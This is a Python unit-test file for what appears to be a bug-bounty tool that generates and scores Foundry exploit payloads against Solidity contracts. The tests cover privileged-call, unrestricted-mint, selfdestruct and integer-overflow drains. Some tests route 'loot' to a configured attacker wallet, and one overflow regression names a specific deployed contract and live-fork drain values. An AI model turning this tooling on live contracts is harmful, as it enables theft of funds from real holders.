import types
import unittest

from bountyscan.forge_verify import (AUTO_VERIFIABLE, M256, PayloadVerdict, build_exploit,
                                     build_overflow_literal, build_overflow_reader, canonical_sig,
                                     classify_overflow, overflow_amount, overflow_verdict, parse_outcome,
                                     parse_overflow_outcome, parse_overflow_reader)
from bountyscan.solidity import Function, Param


def _fn(name, params, body="{}"):
    return Function(kind="function", name=name, contract=None,
                    params=[Param(type=t, name=n) for t, n in params],
                    visibility="external", mutability=None, modifiers=[], body=body, body_offset=0, offset=0)


def _finding(detector, function="f", contract="C"):
    return types.SimpleNamespace(detector=detector, function=function, contract=contract)


class CanonicalSig(unittest.TestCase):
    def test_widens_uint_int(self):
        self.assertEqual(canonical_sig(_fn("mint", [("address", "to"), ("uint", "amount")])), "mint(address,uint256)")

    def test_strips_data_location(self):
        self.assertEqual(canonical_sig(_fn("setData", [("bytes", "d")])), "setData(bytes)")


class BuildExploit(unittest.TestCase):
    def test_privileged_generates_call(self):
        t = build_exploit(_finding("unprotected-privileged-function"),
                          _fn("setController", [("address", "c")]), "0x" + "ab" * 20)
        self.assertIn('abi.encodeWithSignature("setController(address)", attacker)', t)
        self.assertIn("vm.startPrank(attacker, attacker)", t)   # msg.sender AND tx.origin
        self.assertIn('console2.log("CALL_OK", ok)', t)

    def test_mint_uses_nonzero_amount(self):
        t = build_exploit(_finding("unrestricted-mint"), _fn("mint", [("address", "to"), ("uint256", "amount")]), "0x" + "cd" * 20)
        self.assertIn("1000000000000000000", t)   # nonzero amount for a mint
        self.assertIn("TOKEN_DELTA", t)

    def test_addresses_use_checksum_safe_literal_and_wallet(self):
        from bountyscan.forge_verify import ATTACKER_WALLET
        t = build_exploit(_finding("unprotected-privileged-function"),
                          _fn("setController", [("address", "c")]), "0xABc0000000000000000000000000000000000001")
        # target embedded as a NUMBER (00-prefixed) so Solidity's EIP-55 checksum never rejects it
        self.assertIn("address(uint160(0x00abc0000000000000000000000000000000000001))", t)
        # loot routed to the configured receiving wallet
        self.assertIn("address(uint160(0x00" + ATTACKER_WALLET.lower().replace("0x", "") + "))", t)
        self.assertIn("funds must land here", t)

    def test_non_auto_type_returns_none(self):
        self.assertIsNone(build_exploit(_finding("signature-replay"), _fn("claim", [("bytes", "sig")]), "0x0"))

    def test_struct_param_not_encodable(self):
        self.assertIsNone(build_exploit(_finding("unprotected-privileged-function"),
                                        _fn("exec", [("MyStruct", "s")]), "0x0"))


class ParseOutcome(unittest.TestCase):
    def test_revert_is_not_a_finding(self):
        v = parse_outcome(_finding("unprotected-privileged-function"), "CALL_OK false\nATTACKER_WEI_DELTA 0\nTOKEN_DELTA 0")
        self.assertEqual(v.outcome, "reverted")
        self.assertFalse(v.is_finding)   # dropped
        self.assertIn("guard holds", v.detail)

    def test_mint_confirmed_when_tokens_minted(self):
        v = parse_outcome(_finding("unrestricted-mint"), "CALL_OK true\nTOKEN_DELTA 1000000000000000000\nATTACKER_WEI_DELTA 0")
        self.assertEqual(v.outcome, "confirmed")
        self.assertTrue(v.is_finding)

    def test_selfdestruct_no_change_is_dropped(self):
        # Highlander fallback-trap: call succeeds, code intact, no funds moved
        v = parse_outcome(_finding("unprotected-selfdestruct"), "CALL_OK true\nCODE_DELTA 0\nATTACKER_WEI_DELTA 0")
        self.assertEqual(v.outcome, "no_change")
        self.assertFalse(v.is_finding)

    def test_selfdestruct_confirmed_when_code_destroyed(self):
        v = parse_outcome(_finding("unprotected-selfdestruct"), "CALL_OK true\nCODE_DELTA -923\nATTACKER_WEI_DELTA 0")
        self.assertEqual(v.outcome, "confirmed")

    def test_privileged_nonreverting_is_manual_not_confirmed(self):
        v = parse_outcome(_finding("unprotected-privileged-function"), "CALL_OK true\nATTACKER_WEI_DELTA 0\nTOKEN_DELTA 0")
        self.assertEqual(v.outcome, "manual")
        self.assertTrue(v.is_finding)   # kept - we could not prove the negative

    def test_withdrawal_requires_target_loss_differential(self):
        # attacker gained but the TARGET did not lose -> fallback/mint-like -> dropped
        v = parse_outcome(_finding("arbitrary-recipient-withdrawal"),
                          "CALL_OK true\nATTACKER_WEI_DELTA 5\nTOKEN_DELTA 0\nTARGET_WEI_DELTA 0\nTARGET_TOK_DELTA 0")
        self.assertEqual(v.outcome, "no_change")
        self.assertFalse(v.is_finding)
        # attacker gained AND target lost the same funds -> confirmed drain
        v2 = parse_outcome(_finding("arbitrary-recipient-withdrawal"),
                           "CALL_OK true\nATTACKER_WEI_DELTA 5\nTOKEN_DELTA 0\nTARGET_WEI_DELTA -5\nTARGET_TOK_DELTA 0")
        self.assertEqual(v2.outcome, "confirmed")

    def test_privileged_payload_measures_target_deltas(self):
        t = build_exploit(_finding("unprotected-privileged-function"),
                          _fn("sweep", [("address", "to")]), "0x" + "ab" * 20)
        self.assertIn("TARGET_WEI_DELTA", t)
        self.assertIn("TARGET_TOK_DELTA", t)

    def test_report_line_present(self):
        v = parse_outcome(_finding("unrestricted-mint"), "CALL_OK true\nTOKEN_DELTA 5\nATTACKER_WEI_DELTA 0")
        self.assertIn("Payload attack: CONFIRMED", v.report_line())


class OverflowMath(unittest.TestCase):
    """Phase 3 Tier-1: the exact EVM wrap-around input, computed - never fabricated state."""

    def test_wraps_to_target(self):
        # odd multiplier -> unique solution; the product genuinely wraps 2**256.
        sell_price = 1_000_000_000_000_001           # odd
        contract_wei = 42 * 10**18                    # drain the whole balance
        amt = overflow_amount(contract_wei, sell_price)
        self.assertIsNotNone(amt)
        self.assertEqual((amt * sell_price) % M256, contract_wei)   # lands EXACTLY on the balance
        self.assertGreater(amt, 1 << 200)                            # a huge input -> it really overflows

    def test_akivacoin_regression(self):
        # AkivaCoin 0xcffaFCED915D6cC3e9b05ef38B52f0bCcd897E91 - sell(amount) unchecked `amount*sellPrice`.
        # For any odd sellPrice and any balance, the calculator yields the input that wraps to the balance.
        for sell_price in (3, 777, 10**18 + 1):
            for bal in (1, 5 * 10**18, (1 << 255) + 123):
                amt = overflow_amount(bal, sell_price)
                self.assertEqual((amt * sell_price) % M256, bal)

    def test_batch_overflow_to_zero(self):
        # classic batchOverflow: len(2) * value wraps to 0, so require(balance >= 0) passes with no funds.
        amt = overflow_amount(0, 2)
        self.assertEqual((2 * amt) % M256, 0)
        self.assertGreater(amt, 0)

    def test_unsatisfiable_returns_none(self):
        # even multiplier can't hit an odd target (gcd doesn't divide) -> we refuse to invent a solution.
        self.assertIsNone(overflow_amount(3, 2))


class OverflowTiering(unittest.TestCase):
    def test_tier1_batch_overflow_guard_has_product(self):
        fn = types.SimpleNamespace(body="uint t = cnt * value; require(balances[msg.sender] >= cnt * value); balances[to] += value;")
        tier, _ = classify_overflow(fn, set())
        self.assertEqual(tier, 1)

    def test_tier4_balance_gated_amount_is_forbidden(self):
        fn = types.SimpleNamespace(body="require(balanceOf[msg.sender] >= amount); uint pay = amount * sellPrice; msg.sender.transfer(pay);")
        tier, _ = classify_overflow(fn, set())
        self.assertEqual(tier, 4)

    def test_overflow_verdict_tier1_is_latent_not_fabricated(self):
        f = _finding("pre-0.8-overflow", function="batchTransfer")
        fn = types.SimpleNamespace(body="require(balances[msg.sender] >= cnt * value); balances[to] += value;")
        v = overflow_verdict(f, fn, None)
        self.assertEqual(v.outcome, "manual")          # LATENT - never auto-confirmed by injection
        self.assertIn("Tier 1", v.injected)
        self.assertNotIn("CONFIRMED EXPLOIT", v.status_word)

    def test_overflow_verdict_tier4_refused(self):
        f = _finding("pre-0.8-overflow", function="sell")
        fn = types.SimpleNamespace(body="require(balanceOf[msg.sender] >= amount); msg.sender.transfer(amount * sellPrice);")
        v = overflow_verdict(f, fn, None)
        self.assertEqual(v.outcome, "manual")
        self.assertIn("Tier 4", v.injected)
        self.assertIn("REFUSED", v.injected)


class OverflowPoC(unittest.TestCase):
    def test_reader_reads_live_multiplier(self):
        fn = _fn("sell", [("uint256", "amount")], body="balances[msg.sender] -= amount; msg.sender.transfer(amount * sellPrice);")
        reader = build_overflow_reader(fn, "0x" + "ab" * 20)
        self.assertIsNotNone(reader)
        self.assertIn('abi.encodeWithSignature("sellPrice()")', reader)
        self.assertIn("totalSupply()", reader)
        self.assertIn("TARGET.balance", reader)

    def test_literal_injects_exact_amount_soundly(self):
        fn = _fn("sell", [("uint256", "amount")], body="msg.sender.transfer(amount * sellPrice);")
        lit = build_overflow_literal(fn, "0x" + "ab" * 20, (1 << 240) + 192, 1000)
        self.assertIn("uint256 amount = 1766847064778384329583297500742918515827483896875618958121606201292619968;", lit)
        self.assertIn("checked_write", lit)                 # stdstore-verified slot, not a hardcoded 0
        self.assertNotIn("maxUint", lit)                    # not the broken k*(maxUint+1)==0 loop
        self.assertIn('"sell(uint256)"', lit)

    def test_parse_reader(self):
        out = "OVF_PRICE 10000000000000000\nOVF_SUPPLY 1000\nOVF_TGT_ETH 1920000000000000000"
        self.assertEqual(parse_overflow_reader(out), (10000000000000000, 1000, 1920000000000000000))
        self.assertIsNone(parse_overflow_reader("nothing here"))

    def test_tier4_overflow_has_no_auto_poc(self):
        # balance-gated amount -> needs tokens the attacker can't hold -> no fabricated auto-run
        fn = _fn("sell", [("uint256", "amount")], body="require(balanceOf[msg.sender] >= amount); msg.sender.transfer(amount * sellPrice);")
        self.assertIsNone(build_overflow_reader(fn, "0x0"))

    def test_akivacoin_live_values_give_conditional_theoretical(self):
        # the exact values the live fork returned for 0xcffa...E91
        amt = overflow_amount(1920000000000000000, 10000000000000000)
        self.assertEqual(amt, (1 << 240) + 192)             # the OVERFLOWING solution, not the trivial 192
        out = (f"OVF_AMOUNT {amt}\nOVF_SUPPLY 1000\nOVF_CALL_OK true\n"
               "OVF_ATT_ETH_GAIN 1920000000000000000\nOVF_TGT_ETH_DELTA -1920000000000000000")
        v = parse_overflow_outcome(_finding("pre-0.8-overflow"), out, PayloadVerdict(_finding("pre-0.8-overflow"), "manual", "fb"))
        self.assertEqual(v.outcome, "conditional")
        self.assertIn("THEORETICAL", v.detail)              # 2^240 tokens >> 1000 supply

    def test_parse_conditional_when_drained(self):
        f = _finding("pre-0.8-overflow")
        fb = PayloadVerdict(f, "manual", "fallback")
        out = ("OVF_PRICE 777\nOVF_SUPPLY 1000\nOVF_AMOUNT 99999999999999999999999\n"
               "OVF_AMOUNT_GT_SUPPLY true\nOVF_CALL_OK true\nOVF_ATT_ETH_GAIN 5000\nOVF_TGT_ETH_DELTA -5000")
        v = parse_overflow_outcome(f, out, fb)
        self.assertEqual(v.outcome, "conditional")
        self.assertIn("THEORETICAL", v.detail)          # amount > supply -> not freely acquirable
        self.assertIn("ECONOMICALLY CONDITIONAL", v.status_word)

    def test_parse_conditional_critical_when_within_supply(self):
        f = _finding("pre-0.8-overflow")
        out = ("OVF_SUPPLY 10**30\nOVF_AMOUNT 5\nOVF_AMOUNT_GT_SUPPLY false\n"
               "OVF_CALL_OK true\nOVF_ATT_ETH_GAIN 5000\nOVF_TGT_ETH_DELTA -5000\nOVF_PRICE 3")
        v = parse_overflow_outcome(f, out, PayloadVerdict(f, "manual", "fb"))
        self.assertEqual(v.outcome, "conditional")
        self.assertIn("CRITICAL", v.detail)

    def test_parse_reverted_is_dropped(self):
        f = _finding("pre-0.8-overflow")
        v = parse_overflow_outcome(f, "OVF_CALL_OK false\nOVF_AMOUNT 1", PayloadVerdict(f, "manual", "fb"))
        self.assertEqual(v.outcome, "reverted")
        self.assertFalse(v.is_finding)

    def test_parse_no_logs_uses_fallback(self):
        f = _finding("pre-0.8-overflow")
        fb = PayloadVerdict(f, "manual", "static classification")
        self.assertIs(parse_overflow_outcome(f, "Compiler run failed", fb), fb)


if __name__ == "__main__":
    unittest.main()
